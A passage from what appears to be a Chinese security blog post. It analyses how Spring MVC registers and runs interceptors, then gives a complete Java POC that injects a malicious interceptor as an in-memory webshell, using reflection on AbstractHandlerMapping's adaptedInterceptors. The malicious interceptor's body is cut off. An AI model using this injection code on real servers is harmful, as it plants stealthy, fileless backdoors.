#BBBBBB\">.</span><span style=\"color: #F97583\">RequestMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ResponseBody</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">Controller</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> HelloController  &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        @</span><span style=\"color: #F97583\">RequestMapping</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/hello&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> hello(</span><span style=\"color: #F97583\">Model</span><span style=\"color: #B392F0\"> model)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">model</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">addAttribute(</span><span style=\"color: #FFAB70\">&quot;msg&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;success MVC&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;hello&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        @</span><span style=\"color: #F97583\">GetMapping</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/login&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        @</span><span style=\"color: #F97583\">ResponseBody</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> login(</span><span style=\"color: #F97583\">Model</span><span style=\"color: #B392F0\"> model)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">model</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">addAttribute(</span><span style=\"color: #FFAB70\">&quot;msg&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;success&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;testlogin&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>当我们访问 hello 路由时<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709780409533-fbcc9074-73cc-4444-968c-f59833f0114c.png#averageHue=%239db2b4&clientId=u1acac59a-b2bd-4&from=paste&height=137&id=u9ce7f38b&originHeight=226&originWidth=908&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16222&status=done&style=none&taskId=u3a8ce0ab-9d59-4cf4-8adf-ca3f53aae1d&title=&width=550.3029984963736\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>会发现直接被拦截器阻断，返回 loginfirst 字符串<br>但如果我们访问 login 路由<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709780435038-6e559d7d-71d6-44ca-834b-908a049a9b21.png#averageHue=%23abcfbe&clientId=u1acac59a-b2bd-4&from=paste&height=132&id=ud2168b84&originHeight=218&originWidth=730&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=15075&status=done&style=none&taskId=ub6b966fc-146d-4f84-87f8-0b37fa1190c&title=&width=442.42421685281136\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>成功执行了 interceptor 的逻辑，但是 controller 的逻辑并没有执行，这是因为拦截器在接受到请求数据，并且执行完 handler 的逻辑之后，已经把结果写入 response 进行返回了，dispatchservlet 会假定拦截器本身已经处理完毕请求，不会再去执行后续的 controller 逻辑,所以我们之后 controller 该返回的 logintest 字符串就没出来</p>\n<h2 id=\"0x02-interceptor-的调用流程\"><a href=\"#0x02-interceptor-的调用流程\" class=\"headerlink\" title=\"0x02 interceptor 的调用流程\"></a>0x02 interceptor 的调用流程</h2><p>在 interceptor 的执行内容中下一个断点<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709790892112-c1e7eec8-e2f9-4588-bd2f-8a8677ed3be2.png#averageHue=%233f4850&clientId=u1acac59a-b2bd-4&from=paste&height=95&id=u314b2d34&originHeight=157&originWidth=1854&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=144980&status=done&style=none&taskId=u075464a1-f431-4da0-bf8c-566ec828359&title=&width=1123.6362986919346\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后访问 login 路由查看调用栈，会发现其实还是 filter 先执行，然后经过 dispatchservlet 之后才会被分配到执行 interceptor 的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709790663320-723fd81d-465f-4d97-ae2a-30e9f32611dc.png#averageHue=%235c5d56&clientId=u1acac59a-b2bd-4&from=paste&height=341&id=uea7fae2e&originHeight=562&originWidth=978&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=385497&status=done&style=none&taskId=ua80287f3-3830-4c32-a1a1-a63067efa8e&title=&width=592.7272384685609\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>前面的内容就不探究了，我们到 disaptchservlet 的 dodispatch 方法<br>走到如下图的 <code>getHandler</code>处<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791713535-eeceaff7-5038-4abd-bf6c-bd8ebca0d451.png#averageHue=%233d444d&clientId=u1acac59a-b2bd-4&from=paste&height=169&id=ubc6c43bf&originHeight=279&originWidth=1684&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=181274&status=done&style=none&taskId=ubc46d74c-c953-43cb-8101-0ec4b4f03f8&title=&width=1020.6060016166224\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后继续跟进到 getHandler 方法的具体内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791762674-68facd33-9e14-4773-a34c-5491920a42c0.png#averageHue=%233c444c&clientId=u1acac59a-b2bd-4&from=paste&height=268&id=udc3cdaab&originHeight=443&originWidth=2021&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=351859&status=done&style=none&taskId=u671e5ee4-b732-42bd-835b-eb1b2f45984&title=&width=1224.8484140541532\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>最终还是调用到了 <code>AbstractHandlerMapping</code> 的 <code>getHandler</code> 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709791806939-9fa78dc7-b398-42fa-8eba-cdf7c4ef0c2c.png#averageHue=%233c444c&clientId=u1acac59a-b2bd-4&from=paste&height=355&id=u98f48aa9&originHeight=585&originWidth=2115&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=487622&status=done&style=none&taskId=u25f68e83-0c81-46e2-9e17-564e8f70e48&title=&width=1281.8181077310905\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>继续跟进到 <code>getHandlerExecutionChain</code><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792130230-17f71eeb-ea1f-406d-ad79-df04267153f9.png#averageHue=%233e464f&clientId=u8df47c52-911f-4&from=paste&height=238&id=u1fd700f2&originHeight=393&originWidth=1892&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=409825&status=done&style=none&taskId=u72ba2991-98e8-4246-a17d-1a795cfe3fd&title=&width=1146.666600391122\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里的逻辑是最终返回一串 HandlerChain，但是一开始进入方法的时候，HandlerChain 是为空的，我们需要从<code>adaptedInterceptors</code>中循环遍历获取 interceptor，add 到 chain 中，这里默认存在几个自带的 interceptor，最后才会加入我们自己写的 interceptor<br>跟进 addInterceptor<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792123167-8bee5670-3b3c-40ec-a58e-3c347197d085.png#averageHue=%233b424b&clientId=u8df47c52-911f-4&from=paste&height=261&id=u432d23d2&originHeight=431&originWidth=1894&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=440111&status=done&style=none&taskId=u327ca40e-fc8f-4aa4-b297-b3d88b0271b&title=&width=1147.8787215331845\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>直接就调用 add 方法添加了，没有任何过滤<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792436021-c419ccdd-699e-43e5-8936-92ee30dc4561.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=113&id=u8994262f&originHeight=187&originWidth=1645&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=117630&status=done&style=none&taskId=u10f62dc4-7e54-47ac-978f-e4d5ddb22e3&title=&width=996.9696393464037\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>最后直接返回刚才通过循环遍历添加的 interceptor 列表，其中就包括我们写的测试 interceptor<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792493882-7ea5a72f-8e6c-453c-a541-f8f8870174dd.png#averageHue=%233c434b&clientId=u8df47c52-911f-4&from=paste&height=533&id=u8f5a6319&originHeight=879&originWidth=1860&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=883435&status=done&style=none&taskId=u2bb7dc75-d819-49fc-8bea-1fa9cfd0ea9&title=&width=1127.272662118122\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>返回到 dispatch 的逻辑，来到 applyPreHandle 方法，他这里就开始调用每一个 interceptor 的 preHandle 方法了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792650364-ea907d18-95b6-410b-b03c-b243706de5d6.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=105&id=uf1d884bf&originHeight=174&originWidth=1761&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=100259&status=done&style=none&taskId=u1dd5ba29-cc6b-4e0e-bca7-4a10b7fa258&title=&width=1067.2726655860286\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>直到这里就是整个 interceptor 从获取到调用 prehandle 的流程，其实做完整个 prehandle 就是直接开始调用 handle 到 controller 处理逻辑了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709792780416-1aca7c8b-3079-4531-bb4e-cd380d893af1.png#averageHue=%233e444c&clientId=u8df47c52-911f-4&from=paste&height=86&id=u69fbac18&originHeight=142&originWidth=1127&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=63852&status=done&style=none&taskId=udb9cefcd-bf9d-417a-94ce-566447fd9e1&title=&width=683.030263552217\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>根据刚才调用栈和流程分析不难看出，其实 spring 这一层是要优先级低于 tomcat 的，因为毕竟其核心分配器<code>dispatchServlet</code>也属于是 servlet，肯定要执行的比 filter<br>整合一下大概的流程</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">HttpRequest </span><span style=\"color: #F97583\">--&gt;</span><span style=\"color: #B392F0\"> Filter </span><span style=\"color: #F97583\">--&gt;</span><span style=\"color: #B392F0\"> DispactherServlet </span><span style=\"color: #F97583\">--&gt;</span><span style=\"color: #B392F0\"> Interceptor </span><span style=\"color: #F97583\">--&gt;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Controller</span></span></code></pre></div><h2 id=\"0x03-interceptor-内存马的实现流程\"><a href=\"#0x03-interceptor-内存马的实现流程\" class=\"headerlink\" title=\"0x03 interceptor 内存马的实现流程\"></a>0x03 interceptor 内存马的实现流程</h2><p>上面的流程分析其实只是在走 interceptor 被注册完之后走的流程，也就是 interceptor 如何执行的，我们注入 interceptor 内存马就必须直到 interceptor 如何先注册到 <code>adaptedInterceptors</code>中<br>既然是 Spring 型，那所有的想取到的类我们都能通过 IOC 容器去取，这里首先要明确目标，我们要找的是谁？—-&gt;根据刚才的流程分析，我们刚才添加的每一个 interceptor 都是从<code>adaptedInterceptors</code>属性值中取的，所以我们待会要获取的就是 <code>adaptedInterceptors</code>的所属对象—<code>AbstractHandlerMapping</code></p>\n<h3 id=\"1x01-获取AbstractHandlerMapping\"><a href=\"#1x01-获取AbstractHandlerMapping\" class=\"headerlink\" title=\"1x01 获取AbstractHandlerMapping\"></a>1x01 获取<code>AbstractHandlerMapping</code></h3><p>这里前提是已经了解过上面所述的 4 种获取上下文 context 的方法了，我们还学习一种新的获取的方法— 通过反射获取<code>LiveBeansView</code>类  的 applicationContext 来获取，当然其他四种方法也是可以的</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #6B737C\">//通过LiveBeansView获取WebContext</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> field</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.springframework.context.support.LiveBeansView&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;applicationContexts&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">field</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> applicationContext</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">WebApplicationContext</span><span style=\"color: #B392F0\">) ((</span><span style=\"color: #79B8FF\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">LinkedHashSet</span><span style=\"color: #B392F0\">)</span><span style=\"color: #79B8FF\">field</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">))</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">iterator()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next();</span></span></code></pre></div><p>然后就是根据 IOC 容器得到 <code>AbstractHandlerMapping</code></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #6B737C\">//通过IOC容器get到AbstractHandlerMapping</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">AbstractHandlerMapping</span><span style=\"color: #B392F0\"> handlerMapping</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">applicationContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #FFAB70\">&quot;requestMappingHandlerMapping&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">AbstractHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span></code></pre></div><h3 id=\"1x02-动态注册-interceptor\"><a href=\"#1x02-动态注册-interceptor\" class=\"headerlink\" title=\"1x02 动态注册 interceptor\"></a>1x02 动态注册 interceptor</h3><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> field1</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">AbstractHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;adaptedInterceptors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #79B8FF\">field1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; adtedinterceptors </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">ArrayList&lt;</span><span style=\"color: #B392F0\">Object</span><span style=\"color: #F97583\">&gt;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #79B8FF\">field</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(handlerMapping);</span></span></code></pre></div><h3 id=\"1x03-完整-POC\"><a href=\"#1x03-完整-POC\" class=\"headerlink\" title=\"1x03 完整 POC\"></a>1x03 完整 POC</h3><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Interceptor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">TestInterceptor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">junit</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Test</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stereotype</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Controller</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">GetMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ResponseBody</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ContextLoader</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">handler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">AbstractHandlerMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//这里是测试interceptor类型memshell的POC，恶意interceptor在interceptor包中</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">Controller</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> Evil2Controller &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">GetMapping</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/evil2&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">ResponseBody</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> getEvilInterceptor() </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//通过LiveBeansView获取顶级Context</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        Field field=Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        field.setAccessible(true);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        WebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(null)).iterator().next();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//通过ContextLoader.getCurrentWebApplicationContext() 来获取上下文</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">WebApplicationContext</span><span style=\"color: #B392F0\"> applicationContext </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">ContextLoader</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getCurrentWebApplicationContext();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//通过IOC容器get到AbstractHandlerMapping</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">AbstractHandlerMapping</span><span style=\"color: #B392F0\"> handlerMapping</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">applicationContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getBean(</span><span style=\"color: #FFAB70\">&quot;requestMappingHandlerMapping&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">AbstractHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> field1</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">AbstractHandlerMapping</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;adaptedInterceptors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">field1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; adtedinterceptors </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">ArrayList&lt;</span><span style=\"color: #B392F0\">Object</span><span style=\"color: #F97583\">&gt;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #79B8FF\">field1</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(handlerMapping);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">TestInterceptor</span><span style=\"color: #B392F0\"> evilInterceptor</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> TestInterceptor();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">adtedinterceptors</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(evilInterceptor);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;inject sucessfully&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>然后是恶意 interceptor 的内容</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Interceptor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: 